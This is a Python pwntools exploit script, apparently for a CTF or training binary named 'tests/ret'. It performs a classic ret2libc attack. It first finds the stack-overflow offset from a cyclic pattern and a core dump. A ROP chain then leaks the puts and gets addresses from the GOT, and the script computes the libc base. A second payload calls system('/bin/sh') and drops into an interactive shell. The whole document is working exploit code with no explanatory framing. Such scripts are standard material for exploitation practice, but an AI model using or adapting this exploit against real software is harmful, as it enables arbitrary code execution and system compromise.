from pwn import *
# sudo sysctl -w kernel.core_pattern=core
elf = ELF("./tests/ret")
rop = ROP(elf)

offset_leaking = elf.process()
p = elf.process()

context.arch = 'amd64'

OFFSET = b""
if OFFSET == b"":
	log.info("Searching for offset")
	offset_leaking.sendline(cyclic(516,n=8))
	offset_leaking.wait()
	core = Coredump('./core')
	OFFSET = cyclic_find(core.read(core.rsp,8),n=8)
	log.info(f"Offset is {OFFSET}")

p.recv()

rop.call(elf.symbols["puts"], [elf.got['puts']])
rop.call(elf.symbols["puts"], [elf.got['gets']])
rop.call(elf.symbols["main"])

payload1 = [
	b"A"*OFFSET,
	rop.chain()
]

payload1 = b"".join(payload1)

p.sendline(payload1)

puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Puts @ {hex(puts)}")
gets = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
log.info(f"Gets @ {hex(gets)}")

LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
libc = ELF(LIBC)
libcbase = puts - libc.symbols['puts']
log.info(f"base libc {hex(libcbase)}")

roplibc = ROP(libc)

POP_RDI = (roplibc.find_gadget(['pop rdi', 'ret']))[0]
BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("POP_RDI @ %s " % hex(POP_RDI))
log.info("/bin/sh @ %s " % hex(BINSH))
log.info("system @ %s " % hex(SYSTEM))
log.info("exit @ %s " % hex(EXIT))

payload2 = b"A"*OFFSET + p64(POP_RDI+libcbase) + p64(BINSH+libcbase) + p64(SYSTEM+libcbase) + p64(EXIT+libcbase)

p.sendline(payload2)
p.interactive()
